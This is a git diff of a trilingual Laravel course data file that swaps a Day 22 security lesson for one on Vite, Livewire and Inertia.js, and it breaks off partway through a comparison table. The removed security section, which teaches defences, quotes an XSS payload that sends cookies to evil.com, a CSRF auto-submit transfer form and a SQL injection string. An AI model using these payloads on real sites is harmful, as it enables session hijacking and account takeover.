@@ -3,336 +3,393 @@ import type { RoadmapDayDetail } from "@/lib/challenge-data";
 export const LARAVEL_DAY_22_DETAIL: RoadmapDayDetail = {
   overview: [
     {
-      en: "Security is not a feature you bolt on at the end — it is built into every layer from day one.\n\nThink of a bank:\n• <b>ID check at the door</b> — authentication (Breeze, Sanctum from Day 11)\n• <b>Cameras watching every aisle</b> — logging and auditing\n• <b>Time locks on safe-deposit boxes</b> — rate limiting (throttle middleware)\n• <b>Bulletproof glass at tills</b> — input validation (Day 5)\n• <b>Serial numbers on every form</b> — CSRF tokens\n\nLaravel has <b>built-in defences for every one of these layers</b>. Today we learn how each attack works in plain English, and how to stop it.",
-      np: "Security = layered defence। Laravel मा CSRF, XSS, SQL injection, mass assignment, rate limiting सबैको built-in protection।",
-      jp: "セキュリティは後付けではなく全層に組み込む。CSRF・XSS・SQLi・マスアサイン・レート制限を解説。",
+      en: "Modern Laravel apps almost always have a frontend story. You have three main paths: <b>Blade + Livewire</b> (server-rendered, reactive without writing JavaScript), <b>Inertia.js</b> (SPA feel with Vue or React, using Laravel routing and controllers), or a fully decoupled <b>API + frontend</b> (Sanctum + Next.js/Nuxt — covered in Day 15). Today covers Livewire and Inertia — the two \"integrated\" approaches that keep your team in one codebase.",
+      np: "Laravel frontend: Livewire (PHP-centric, reactive), Inertia.js (Vue/React + Laravel routing), वा Sanctum API। आज Livewire र Inertia cover गर्छौं।",
+      jp: "Laravel のフロントエンド: Livewire（PHP 中心）、Inertia.js（Vue/React + Laravel ルーティング）、Sanctum API の 3 択。今日は Livewire と Inertia を学ぶ。",
     },
     {
-      en: "The 5 attack types we cover today — in plain English:\n\n• <b>CSRF</b> — an attacker tricks your logged-in user's browser into silently making a request your app thinks is legitimate\n  ↳ Defence: unique hidden token in every form that only your server knows\n• <b>XSS</b> — an attacker injects JavaScript into your page that runs in other users' browsers\n  ↳ Defence: always escape output; Blade's `{{ }}` does this automatically\n• <b>SQL injection</b> — an attacker sends data that escapes your query and runs their own SQL\n  ↳ Defence: Eloquent and Query Builder use PDO prepared statements everywhere\n• <b>Mass assignment</b> — an attacker submits extra fields (like `is_admin=true`) your app saves without checking\n  ↳ Defence: `$fillable` whitelist on every model\n• <b>Brute force / rate limiting</b> — an attacker tries thousands of passwords per second\n  ↳ Defence: `throttle` middleware capping requests per time window",
-      np: "CSRF, XSS, SQL injection, mass assignment, rate limiting — हरेकको attack र defence।",
-      jp: "CSRF・XSS・SQLi・マスアサイン・レート制限の攻撃手法と Laravel の防御策。",
+      en: "What each option is best for:\n\n<b>Livewire</b> — best when your team prefers PHP and minimal JavaScript\n↳ Think of it as interactive Blade — components re-render server-side on user interaction\n• No JavaScript framework to learn\n• Two-way data binding with `wire:model`\n• Full access to Laravel validation, auth, and Eloquent\n\n<b>Inertia.js</b> — best when your team knows Vue or React and wants a proper SPA\n↳ Think of it as using Laravel as a JSON API but with server-side routing (no `/api` prefix, no token management)\n• Controllers return Inertia responses instead of JSON\n• Vue/React page components receive props directly from controllers\n\n<b>Vite</b> — the asset bundler used by both; replaces Laravel Mix\n↳ Hot Module Replacement, near-instant builds, works with React, Vue, TypeScript",
+      np: "Livewire: PHP-first, reactive Blade। Inertia: Vue/React + Laravel routing। Vite: asset bundler (Laravel Mix को replacement)।",
+      jp: "Livewire: PHP 重視・Blade 拡張。Inertia: Vue/React + Laravel ルーティング。Vite: アセットバンドラー（Mix の後継）。",
     },
   ],
   sections: [
     {
       title: {
-        en: "CSRF — Cross-Site Request Forgery",
-        np: "CSRF",
-        jp: "CSRF（クロスサイトリクエストフォージェリ）",
+        en: "Vite — asset bundling in Laravel",
+        np: "Vite — asset bundling",
+        jp: "Vite — アセットバンドル",
       },
       blocks: [
         {
           type: "paragraph",
           text: {
-            en: "<b>How CSRF works:</b>\n\nImagine you are logged in to your bank at `mybank.com`. Your browser holds a session cookie. You then visit `evil-site.com`, which has this hidden form:\n\n`<form action=\"https://mybank.com/transfer\" method=\"POST\"><input name=\"to\" value=\"attacker\"><input name=\"amount\" value=\"9999\"></form>`\n\nWhen the page loads, a script auto-submits the form. Your browser <b>automatically sends the session cookie</b> with the POST — the bank sees a valid session and processes the transfer.\n\n<b>Laravel's defence:</b> Every form gets a unique secret token (`_token`) generated per session. The malicious site cannot read this token (same-origin policy), so its fake request is rejected.\n\n↳ Blade's `@csrf` directive injects the hidden `_token` field automatically.",
-            np: "CSRF = attacker ले user को browser बाट silently POST गराउँछ। Defence: session-specific `_token`।",
-            jp: "CSRF は攻撃者が他サイトから被害者のブラウザで POST させる攻撃。`@csrf` で防御。",
+            en: "Before diving into Livewire or Inertia, you need to understand the asset pipeline. <b>Vite</b> is a build tool — it takes your JS, CSS, and TypeScript files and bundles them for the browser. It replaced Laravel Mix in Laravel 10+.\n\nThe key win over Mix:\n• Dev server starts instantly (no webpack cold start)\n• Hot-reloads changes in milliseconds instead of seconds\n• Native TypeScript and JSX support with zero config\n• Smaller production bundles via tree-shaking",
+            np: "Vite = JS/CSS build tool। Laravel 10+ मा Laravel Mix को replacement। Hot reload instant छ।",
+            jp: "Vite は JS/CSS ビルドツール。Laravel 10 以降 Mix の後継。ホットリロードが高速。",
           },
         },
         {
           type: "code",
-          title: {
-            en: "Blade @csrf + excluding webhook routes",
-            np: "@csrf directive र webhook exclusion",
-            jp: "@csrf と Webhook 除外",
-          },
-          code: `{{-- resources/views/posts/create.blade.php --}}
-<form method="POST" action="/posts">
-    @csrf   {{-- injects <input type="hidden" name="_token" value="..."> --}}
+          title: { en: "vite.config.js + Blade integration", np: "vite.config.js", jp: "vite.config.js" },
+          code: `// vite.config.js (default Laravel setup)
+import { defineConfig } from 'vite';
+import laravel from 'laravel-vite-plugin';
 
-    <input type="text" name="title">
-    <button type="submit">Create Post</button>
-</form>
+export default defineConfig({
+    plugins: [
+        laravel({
+            input: ['resources/css/app.css', 'resources/js/app.js'],
+            refresh: true, // auto-refresh Blade on change
+        }),
+    ],
+});
 
-// Excluding routes that receive external webhooks
-// app/Http/Middleware/VerifyCsrfToken.php
-protected $except = [
-    'stripe/webhook',
-    'github/webhook',
-    // Add external webhook routes here ONLY
-];
+// Adding React support
+// npm install @vitejs/plugin-react
+import react from '@vitejs/plugin-react';
 
-// API routes (routes/api.php) do NOT have CSRF middleware by default.
-// They use Sanctum token auth instead — tokens prove identity better than cookies.`,
+export default defineConfig({
+    plugins: [
+        laravel({ input: ['resources/js/app.jsx'], refresh: true }),
+        react(),
+    ],
+});
+
+// In Blade layouts — include compiled assets
+// resources/views/layouts/app.blade.php
+@vite(['resources/css/app.css', 'resources/js/app.js'])
+
+// Dev: npm run dev   (starts Vite dev server with HMR)
+// Prod: npm run build  (outputs to public/build/ with hashed filenames)`,
         },
         {
           type: "paragraph",
           text: {
-            en: "<b>When is it safe to exclude a route from CSRF?</b>\n\nOnly exclude routes that receive requests from <b>external systems that cannot hold a session</b>:\n• Payment gateway webhooks (Stripe, PayPal)\n• Version control webhooks (GitHub, GitLab)\n• Third-party service callbacks\n\n<b>Never exclude:</b>\n• Login, register, password reset\n• Any user-facing form\n• Any route that modifies user data\n\n↳ Do NOT remove `VerifyCsrfToken` from your middleware stack entirely — that disables protection for all web routes. Use `$except` for surgical exclusions only.",
-            np: "CSRF exclude: external webhooks मात्र। Login/register/forms कहिल्यै exclude नगर्नुहोस्।",
-            jp: "CSRF 除外は外部 Webhook のみ。ログイン・フォームは絶対に除外しない。",
+            en: "Vite in production (`npm run build`) outputs versioned files to `public/build/manifest.json`. The `@vite()` directive reads this manifest to inject the correct hashed filenames. Never commit the `public/build/` folder to git — always run `npm run build` in your CI/CD pipeline.",
+            np: "Production मा `npm run build` चलाउनुस्। `public/build/` git मा commit नगर्नुस् — CI/CD मा build गर्नुस्।",
+            jp: "本番は `npm run build`。`public/build/` は git に含めず、CI/CD でビルドする。",
           },
         },
       ],
     },
     {
       title: {
-        en: "XSS — Cross-Site Scripting",
-        np: "XSS",
-        jp: "XSS（クロスサイトスクリプティング）",
+        en: "Livewire — reactive PHP components",
+        np: "Livewire — reactive PHP components",
+        jp: "Livewire — リアクティブ PHP コンポーネント",
       },
       blocks: [
         {
           type: "paragraph",
           text: {
-            en: "<b>How XSS works:</b>\n\nAn attacker stores this in a blog comment: `<script>document.location='https://evil.com?c='+document.cookie</script>`\n\nIf your app renders that comment as raw HTML, <b>every visitor's browser runs the script</b> — their session cookies are stolen and sent to the attacker.\n\nXSS can:\n• Steal session cookies and hijack accounts\n• Redirect users to phishing pages\n• Inject keyloggers to capture passwords\n• Deface your site for all visitors\n\n<b>Laravel's defence:</b> Blade's `{{ }}` syntax <b>auto-escapes HTML entities</b> — `<script>` becomes `&lt;script&gt;` which the browser displays as text, not code.\n\n↳ The only dangerous syntax is `{!! !!}` which renders raw, unescaped HTML.",
-            np: "XSS = attacker ले JS inject गर्छ — cookies चोर्न, redirect गर्न। Defence: `{{ }}` auto-escape।",
-            jp: "XSS は悪意ある JS を注入する攻撃。Blade `{{ }}` が HTML を自動エスケープして防御。",
+            en: "Livewire works by rendering a component as HTML on the server, sending it to the browser, and then — when the user interacts (types, clicks, submits) — sending a small Ajax request back to re-render just that component. No page refresh, no JavaScript state management, no REST API needed.\n\nAnalogy: it's like a turbo-charged Blade component that can react to user input.",
+            np: "Livewire = server-side HTML render गर्छ। User interact गर्दा Ajax request पठाउँछ, component फेरि render हुन्छ। JavaScript framework चाहिँदैन।",
+            jp: "Livewire はサーバー側で HTML をレンダリングし、ユーザー操作時に Ajax で再レンダリング。JS フレームワーク不要。",
           },
         },
         {
           type: "code",
-          title: {
-            en: "Safe vs dangerous Blade output + HTMLPurifier",
-            np: "Safe `{{ }}` vs dangerous `{!! !!}`",
-            jp: "安全な出力と危険な出力",
-          },
-          code: `{{-- SAFE — Blade escapes HTML entities automatically --}}
-{{ $user->bio }}
-{{-- If bio = "<script>alert('xss')</script>" --}}
-{{-- Rendered as: &lt;script&gt;alert('xss')&lt;/script&gt; --}}
+          title: { en: "SearchPosts Livewire component", np: "Livewire component example", jp: "Livewire コンポーネント例" },
+          code: `// php artisan make:livewire SearchPosts
+// Creates: app/Livewire/SearchPosts.php + resources/views/livewire/search-posts.blade.php
 
-{{-- DANGEROUS — renders raw HTML without escaping --}}
-{!! $user->bio !!}
-{{-- If bio = "<script>alert('xss')</script>" --}}
-{{-- Browser EXECUTES the script --}}
+// app/Livewire/SearchPosts.php
+namespace App\\Livewire;
 
-{{-- SAFE — strip all HTML tags before display --}}
-{{ strip_tags($user->bio) }}
+use Livewire\\Component;
+use App\\Models\\Post;
 
-{{-- SAFE — for rich text editors: use HTMLPurifier to allow SAFE HTML --}}
-{{-- composer require ezyang/htmlpurifier --}}
-$config = HTMLPurifier_Config::createDefault();
-$purifier = new HTMLPurifier($config);
-$safeHtml = $purifier->purify($request->input('body'));
-
-// Only use {!! !!} for content YOU generate — never for user input
-{!! $markdown->toHtml($post->body) !!} // OK: markdown renderer output`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>The rule is simple:</b>\n\n• Always use `{{ }}` — it is safe by default\n• Never use `{!! !!}` for user-generated content without running it through HTMLPurifier first\n\n<b>Legitimate uses for `{!! !!}`:</b>\n• A Markdown renderer you control (input comes from your database, not users directly)\n• Generated SVG or chart HTML\n• Localised content from a trusted CMS your team manages\n\n<b>Content Security Policy (CSP)</b> adds a second layer:\n• A CSP header tells the browser to only execute scripts from your own domain\n• Even if an attacker injects `<script src=\"evil.com/xss.js\">`, the browser blocks it\n  ↳ We cover CSP headers in Section 5",
-            np: "`{{ }}` = always safe। `{!! !!}` = user content मा HTMLPurifier पछि मात्र।",
-            jp: "`{{ }}` は常に安全。`{!! !!}` はユーザー入力に直接使わない。CSP ヘッダーで多重防御。",
-          },
-        },
-      ],
-    },
-    {
-      title: {
-        en: "SQL injection & mass assignment protection",
-        np: "SQL injection र mass assignment",
-        jp: "SQL インジェクションとマスアサイン",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>SQL injection in plain English:</b>\n\nImagine a login form. You type your email: `admin@site.com` and the app builds: `SELECT * FROM users WHERE email = 'admin@site.com'`\n\nAn attacker types: `' OR '1'='1` — the app builds: `SELECT * FROM users WHERE email = '' OR '1'='1'` — this always returns ALL users. The attacker is logged in as the first user (often an admin).\n\n<b>Why Eloquent is safe by default:</b> Eloquent and the Query Builder use <b>PDO prepared statements</b>. User input is passed as a parameter (a `?` placeholder), never concatenated into the SQL string. The database treats it as data, never as code.\n\n<b>Mass assignment in plain English:</b> If you `User::create($request->all())`, whatever fields the user submits get saved — including `is_admin`, `role`, or `balance`. An attacker can submit any column name.",
-            np: "SQL injection: string concatenation खतरनाक। Eloquent PDO prepared statements प्रयोग गर्छ — safe। Mass assignment: `$fillable` define गर्नुहोस्।",
-            jp: "Eloquent は PDO 準備文でSQLi を防ぐ。マスアサインは `$fillable` ホワイトリストで守る。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "Safe vs unsafe queries + mass assignment protection",
-            np: "Safe queries र mass assignment",
-            jp: "安全なクエリとマスアサイン防御",
-          },
-          code: `// ❌ DANGEROUS — string interpolation, SQL injection possible
-$email = $request->input('email');
-DB::statement("SELECT * FROM users WHERE email = '$email'");
-
-// ✅ SAFE — PDO prepared statement, user input is bound as data
-User::where('email', $email)->first();
-
-// ✅ SAFE — manual binding (use when raw SQL is truly necessary)
-DB::select('SELECT * FROM users WHERE email = ?', [$email]);
-DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);
-
-// ── Mass assignment ─────────────────────────────────────────────
-
-// ❌ DANGEROUS — saves every field the user submits, including is_admin
-User::create($request->all());
-
-// ✅ SAFE — only allow the fields we explicitly permit
-User::create($request->only(['name', 'email', 'password']));
-
-// ✅ SAFE — $fillable whitelist on the model
-class User extends Model
+class SearchPosts extends Component
 {
-    // Only these columns can be mass-assigned
-    protected $fillable = ['name', 'email', 'password'];
+    public string $search = '';
 
-    // ❌ NEVER do this in production — disables all mass assignment protection
-    // protected $guarded = [];
-}`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>Mass assignment rules:</b>\n\n• `$fillable` is a <b>whitelist</b> — only named columns can be set via `create()` or `fill()`\n• `$guarded` is a <b>blacklist</b> — columns listed here are blocked, everything else is allowed\n• `$guarded = []` means <b>no protection at all</b> — never use in production\n\n<b>The safe default:</b> define `$fillable` on every model that accepts user input. Be explicit about what users are allowed to set.\n\n↳ Validation (Day 5) catches <b>invalid values</b>. Mass assignment protection catches <b>extra fields</b> you never intended users to control. Both are necessary.",
-            np: "`$fillable` = whitelist (safe)। `$guarded = []` = no protection (खतरनाक)।",
-            jp: "`$fillable` はホワイトリスト。`$guarded = []` は全解除で危険。本番では必ず `$fillable` を定義。",
-          },
-        },
-      ],
-    },
+    // Runs automatically whenever $search changes
+    public function updatedSearch(): void
     {
-      title: {
-        en: "Rate limiting & brute-force protection",
-        np: "Rate limiting",
-        jp: "レート制限とブルートフォース対策",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>Why rate limiting matters:</b>\n\nWithout it:\n• A bot can try 86,400 different passwords per second on your login form\n• A competitor can scrape your entire product catalogue in seconds\n• A DDoS attack can hammer a single endpoint and crash your server\n\nRate limiting <b>caps how many requests</b> a user (or IP) can make in a time window. Exceed the limit → `429 Too Many Requests`.\n\n<b>Two levels in Laravel:</b>\n• <b>Built-in `throttle` middleware</b> — quick to add, good for most cases\n• <b>`RateLimiter` facade</b> — custom logic (per-user, per-IP, per-subscription tier)",
-            np: "Rate limiting: bot attacks, scraping, DDoS रोक्न। `throttle` middleware वा `RateLimiter` facade।",
-            jp: "レート制限はボット攻撃・スクレイピング・DDoS を防ぐ。`throttle` や `RateLimiter` を使う。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "throttle middleware + custom RateLimiter",
-            np: "throttle र custom RateLimiter",
-            jp: "throttle ミドルウェアとカスタム RateLimiter",
-          },
-          code: `// routes/web.php — simple throttle: 5 attempts per 1 minute
-Route::post('/login', [LoginController::class, 'store'])
-    ->middleware('throttle:5,1');
+        $this->resetPage(); // reset pagination on new search
+    }
 
-// routes/api.php — 60 requests per minute for API
-Route::middleware(['auth:sanctum', 'throttle:api'])->group(function () {
-    Route::apiResource('posts', PostController::class);
-});
-
-// Define named rate limiters in AppServiceProvider::boot()
-use Illuminate\\Support\\Facades\\RateLimiter;
-use Illuminate\\Cache\\RateLimiting\\Limit;
-
-RateLimiter::for('api', function (Request $request) {
-    return Limit::perMinute(60)
-                ->by($request->user()?->id ?: $request->ip());
-});
-
-// Tiered limiting — more requests for premium users
-RateLimiter::for('uploads', function (Request $request) {
-    return $request->user()->isPremium()
-        ? Limit::perHour(500)->by($request->user()->id)
-        : Limit::perHour(50)->by($request->user()->id);
-});
-
-// When the limit is hit, Laravel automatically returns:
-// HTTP 429 Too Many Requests
-// Headers: Retry-After: 60, X-RateLimit-Remaining: 0`,
-        },
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>What happens when the limit is hit:</b>\n\nLaravel returns `429 Too Many Requests` automatically. The response includes:\n• `Retry-After: 60` — how many seconds until the limit resets\n• `X-RateLimit-Limit: 5` — the maximum allowed requests\n• `X-RateLimit-Remaining: 0` — remaining requests in the window\n\n<b>Recommended limits for common endpoints:</b>\n• Login / register: `throttle:5,1` (5 per minute — aggressive brute-force protection)\n• Password reset: `throttle:3,1` (3 per minute)\n• General API: `throttle:60,1` (60 per minute per user)\n• Public search: `throttle:30,1` (30 per minute per IP)\n\n↳ For advanced protection, use a dedicated package like `laravel-security` or put a WAF (Cloudflare, AWS WAF) in front of your app.",
-            np: "429 response मा `Retry-After` header। Login: 5/min, API: 60/min, Search: 30/min।",
-            jp: "制限超過で 429。`Retry-After` ヘッダーで再試行タイミングを通知。エンドポイント別に設定推奨。",
-          },
-        },
-      ],
-    },
+    public function render()
     {
-      title: {
-        en: "Security headers & Content Security Policy",
-        np: "Security headers",
-        jp: "セキュリティヘッダーとCSP",
-      },
-      blocks: [
-        {
-          type: "paragraph",
-          text: {
-            en: "<b>Security headers</b> are HTTP response headers that tell the browser how to behave — like safety rules posted on the wall.\n\nWithout them, browsers allow by default:\n• Your page to be embedded in iframes on other sites (<b>clickjacking</b>)\n• Mixed HTTP/HTTPS content (downgrades TLS protection)\n• Scripts loaded from any domain (XSS amplified)\n• Browser sniffing your content type (MIME sniffing attacks)\n\nAdding security headers <b>costs you nothing</b> (a single middleware) and prevents entire categories of attack that would otherwise require complex code fixes.",
-            np: "Security headers = browser लाई safety rules। Clickjacking, MIME sniffing, mixed content रोक्छ।",
-            jp: "セキュリティヘッダーはブラウザへの安全規則。クリックジャッキング・MIME スニッフィングを防ぐ。",
-          },
-        },
-        {
-          type: "code",
-          title: {
-            en: "SecurityHeaders middleware — create and register",
-            np: "SecurityHeaders middleware",
-            jp: "セキュリティヘッダーミドルウェア",
-          },
-          code: `<?php
-// app/Http/Middleware/SecurityHeaders.php
-namespace App\\Http\\Middleware;
-
-use Closure;
-use Illuminate\\Http\\Request;
-
-class SecurityHeaders
-{
-    public function handle(Request $request, Closure $next): mixed
-    {
-        $response = $next($request);
-
-        $response->headers->set('X-Frame-Options', 'SAMEORIGIN');
-        $response->headers->set('X-Content-Type-Options', 'nosniff');
-        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
-        $response->headers->set('Permissions-Policy', 'geolocation=(), camera=(), microphone=()');
-        $response->headers->set(
-            'Content-Security-Policy',
-            "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
-        );
-
-        return $response;
+        return view('livewire.search-posts', [
+            'posts' => Post::where('title', 'like', "%{$this->search}%")
+                ->latest()
+                ->limit(20)
+                ->get(),
+        ]);
     }
 }
 
-// Register globally in bootstrap/app.php (Laravel 11)
-->withMiddleware(function (Middleware $middleware) {
-    $middleware->append(SecurityHeaders::class);
-})`,
+// resources/views/livewire/search-posts.blade.php
+<div>
+    <input wire:model.live.debounce.300ms="search"
+           type="text"
+           placeholder="Search posts..."
+           class="w-full border rounded px-3 py-2" />
+
+    <ul class="mt-4 space-y-2">
+        @foreach ($posts as $post)
+            <li>{{ $post->title }}</li>
+        @endforeach
+    </ul>
+</div>
+
+{{-- Include in any Blade view --}}
+<livewire:search-posts />`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "Key Livewire directives:\n• `wire:model` — two-way data binding (input ↔ PHP property)\n  ↳ `wire:model.live` updates on every keystroke; `wire:model.blur` updates on focus-out\n  ↳ `wire:model.live.debounce.300ms` waits 300ms after the user stops typing\n• `wire:click` — call a PHP method on click: `wire:click=\"deletePost({{ $post->id }})\"`\n• `wire:submit` — handle form submission server-side\n• `wire:loading` — show/hide an element while a network request is in flight\n  ↳ `wire:loading.class=\"opacity-50\"` dims the component while loading",
+            np: "`wire:model`, `wire:click`, `wire:submit`, `wire:loading` — Livewire का मुख्य directives।",
+            jp: "`wire:model`（双方向バインド）、`wire:click`（メソッド呼び出し）、`wire:submit`、`wire:loading` が主なディレクティブ。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Livewire — forms, validation & lifecycle hooks",
+        np: "Livewire forms, validation र lifecycle",
+        jp: "Livewire のフォーム・バリデーション・ライフサイクル",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Livewire form handling feels like writing a normal PHP form but without the redirect cycle. Define properties, validate with the same rules as Form Requests, and show errors with `@error`. For complex forms, use the `Form` object class (Livewire 3) to encapsulate form state and validation in one place.",
+            np: "Livewire forms = PHP properties + validate() + @error। Redirect cycle नभई direct update हुन्छ।",
+            jp: "Livewire のフォームは PHP プロパティ + `validate()` + `@error`。リダイレットなしで即更新。",
+          },
+        },
+        {
+          type: "code",
+          title: { en: "CreatePost Livewire form", np: "CreatePost form", jp: "CreatePost フォーム" },
+          code: `// app/Livewire/CreatePost.php
+namespace App\\Livewire;
+
+use Livewire\\Component;
+use App\\Models\\Post;
+
+class CreatePost extends Component
+{
+    public string $title = '';
+    public string $body  = '';
+
+    // Livewire 3: attribute-based validation
+    #[\\Livewire\\Attributes\\Validate('required|min:3|max:255')]
+    public string $titleField = '';
+
+    protected $rules = [
+        'title' => 'required|min:3|max:255',
+        'body'  => 'required|min:10',
+    ];
+
+    public function save(): void
+    {
+        $validated = $this->validate();
+
+        Post::create([
+            ...$validated,
+            'user_id' => auth()->id(),
+        ]);
+
+        $this->reset(['title', 'body']); // clear form
+        session()->flash('message', 'Post created successfully.');
+    }
+
+    public function render()
+    {
+        return view('livewire.create-post');
+    }
+}
+
+{{-- resources/views/livewire/create-post.blade.php --}}
+<form wire:submit="save">
+    <div>
+        <input wire:model="title" type="text" placeholder="Post title" />
+        @error('title') <span class="text-red-500">{{ $message }}</span> @enderror
+    </div>
+    <div class="mt-3">
+        <textarea wire:model="body" placeholder="Post body"></textarea>
+        @error('body') <span class="text-red-500">{{ $message }}</span> @enderror
+    </div>
+    <button type="submit" wire:loading.attr="disabled">
+        <span wire:loading>Saving...</span>
+        <span wire:loading.remove>Save Post</span>
+    </button>
+</form>`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>Livewire lifecycle hooks</b>:\n• `mount()` — runs once when the component is first created (like a constructor)\n  ↳ Use it to load initial data: `$this->post = Post::find($id)`\n• `updated($property)` — runs after any property changes\n  ↳ Avoid expensive queries here; debounce or use `updatedTitle()` for specific properties\n• `hydrate()` / `dehydrate()` — run before/after each network request\n  ↳ Use for re-initialising non-serialisable state (e.g. DB connections)\n• `#[Lazy]` attribute — defers component rendering until after the page loads (great for heavy components)",
+            np: "`mount()`, `updated()`, `hydrate()`/`dehydrate()` — Livewire lifecycle hooks।",
+            jp: "`mount()`（初期化）、`updated()`（プロパティ変更後）、`hydrate()`/`dehydrate()`（リクエスト前後）が主なライフサイクル。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Inertia.js — SPA feel, server-side routing",
+        np: "Inertia.js — SPA feel with server-side routing",
+        jp: "Inertia.js — SPA 感覚＋サーバー側ルーティング",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Inertia is not a framework — it's a protocol. It sits between Laravel (server) and Vue/React (client) and lets them speak the same language.\n\nYour Laravel controller returns an Inertia response: `Inertia::render('PostIndex', ['posts' => $posts])`. On first load, the full HTML is returned. Subsequent navigations return a JSON payload that swaps out just the current page component — no full page reload, no routing library needed on the frontend.\n\nAnalogy: imagine a TV remote that changes what's showing on screen without turning the TV off and on again.",
+            np: "Inertia = Laravel controller + Vue/React page components। Page navigation = JSON swap (no full reload)।",
+            jp: "Inertia は Laravel コントローラーと Vue/React ページコンポーネントをつなぐプロトコル。ページ遷移は JSON スワップ（フルリロードなし）。",
+          },
+        },
+        {
+          type: "code",
+          title: { en: "Inertia setup + controller + Vue page", np: "Inertia example", jp: "Inertia の例" },
+          code: `// Install
+// composer require inertiajs/inertia-laravel
+// npm install @inertiajs/vue3 vue
+
+// resources/views/app.blade.php (root layout)
+<!DOCTYPE html>
+<html>
+<head>
+    @vite(['resources/js/app.js'])
+    @inertiaHead
+</head>
+<body>
+    @inertia
+</body>
+</html>
+
+// resources/js/app.js
+import { createApp, h } from 'vue';
+import { createInertiaApp } from '@inertiajs/vue3';
+
+createInertiaApp({
+    resolve: name => {
+        const pages = import.meta.glob('./Pages/**/*.vue', { eager: true });
+        return pages[\`./Pages/\${name}.vue\`];
+    },
+    setup({ el, App, props, plugin }) {
+        createApp({ render: () => h(App, props) })
+            .use(plugin)
+            .mount(el);
+    },
+});
+
+// app/Http/Controllers/PostController.php
+use Inertia\\Inertia;
+use App\\Http\\Resources\\PostResource;
+
+public function index()
+{
+    return Inertia::render('Posts/Index', [
+        'posts' => PostResource::collection(Post::with('author')->latest()->paginate(15)),
+    ]);
+}
+
+// resources/js/Pages/Posts/Index.vue
+<script setup>
+import { Link } from '@inertiajs/vue3';
+
+defineProps({ posts: Object });
+</script>
+
+<template>
+  <div>
+    <Link href="/posts/create">New Post</Link>
+    <div v-for="post in posts.data" :key="post.id">
+      <Link :href="\`/posts/\${post.id}\`">{{ post.title }}</Link>
+    </div>
+  </div>
+</template>`,
+        },
+        {
+          type: "paragraph",
+          text: {
+            en: "<b>Shared data</b> — auth user, flash messages, and app-wide props belong in `HandleInertiaRequests` middleware's `share()` method, so they're available in every page component:\n• `auth.user` → `usePage().props.auth.user` in Vue/React\n• `flash.message` → show success/error banners globally\n• `ziggy` → share named routes to the frontend (with the Ziggy package)\n\nThis is the Inertia equivalent of Blade's `@auth` / `view()->share()` — define once, use everywhere.",
+            np: "`HandleInertiaRequests::share()` मा auth user, flash messages राख्नुस् — सबै pages मा available हुन्छ।",
+            jp: "`HandleInertiaRequests::share()` に認証ユーザーやフラッシュを設定すると全ページで利用できる。",
+          },
+        },
+      ],
+    },
+    {
+      title: {
+        en: "Choosing your stack & SSR considerations",
+        np: "Stack छनोट र SSR",
+        jp: "スタック選択と SSR",
+      },
+      blocks: [
+        {
+          type: "paragraph",
+          text: {
+            en: "Which frontend approach to choose — the honest decision matrix:\n• Full PHP team, existing Blade app → add Livewire incrementally to specific components\n  ↳ No big rewrite; Blade and Livewire coexist perfectly\n• Vue/React team, wants tight Laravel integration → Inertia\n  ↳ Controllers, validation, auth all stay in PHP — just the views move to Vue/React\n• Separate mobile app OR third-party consumers → Sanctum API (Day 15)\n  ↳ Completely decoupled; frontend can be any technology\n• Need SEO on a Vue/React Inertia app → enable Inertia SSR with `php artisan inertia:start-ssr`",
+            np: "PHP team → Livewire। Vue/React team → Inertia। Mobile/API → Sanctum। SEO चाहिने → Inertia SSR।",
+            jp: "PHP チーム→ Livewire。Vue/React チーム→ Inertia。モバイル/API→ Sanctum。SEO 必要→ Inertia SSR。",
+          },
         },
         {
           type: "table",
           caption: {
-            en: "Key security headers — what they do and the recommended value",
-            np: "Security headers cheat-sheet",
-            jp: "セキュリティヘッダー一覧",
+            en: "Frontend approach comparison",
+            np: "Frontend approaches",
+            jp: "フロントエンドアプローチ比較",
           },
           headers: [
-            { en: "Header", np: "Header", jp: "ヘッダー" },
-            { en: "What it prevents", np: "के रोक्छ", jp: "防ぐ攻撃" },
-            { en: "Recommended value", np: "सिफारिस value", jp: "推奨値" },
+            { en: "Approach", np: "Approach", jp: "アプローチ" },
+            { en: "JS required", np: "JS", jp: "JS 必要" },
+            { en: "Routing", np: "Routing", jp: "ルーティング" },
+            { en: "Auth", np: "Auth", jp: "認証" },
+            { en: "SEO", np: "SEO", jp: "SEO" },
+            { en: "Best for", np: "Best for", jp: "向いている用途" },
           ],
           rows: [
             [
-              { en: "X-Frame-Options", np: "X-Frame-Options", jp: "X-Frame-Options" },
-              { en: "Clickjacking — embedding your site in a hidden iframe", np: "Clickjacking", jp: "クリックジャッキング" },
-              { en: "`SAMEORIGIN`", np: "`SAMEORIGIN`", jp: "`SAMEORIGIN`" },
+              { en: "Blade", np: "Blade", jp: "Blade" },
+              { en: "None", np: "नभएको", jp: "不要" },
+              { en: "Server", np: "Server", jp: "サーバー" },
+              { en: "Session", np: "Session", jp: "セッション" },
+              { en: "Excellent", np: "उत्तम", jp: "優秀" },
+              { en: "Content sites", np: "Content sites", jp: "コンテンツサイト" },
             ],
             [
-              { en: "X-Content-Type-Options", np: "X-Content-Type-Options", jp: "X-Content-Type-Options" },
-              { en: "MIME sniffing — browser guessing content type and running scripts", np: "MIME sniffing", jp: "MIME スニッフィング" },
-              { en: "`nosniff`", np: "`nosniff`", jp: "`nosniff`" },
+              { en: "Livewire", np: "Livewire", jp: "Livewire" },
+              { en: "Minimal", np: "न्यूनतम", jp: "最小限" },
+              { en: "Server", np: "Server", jp: "サーバー" },
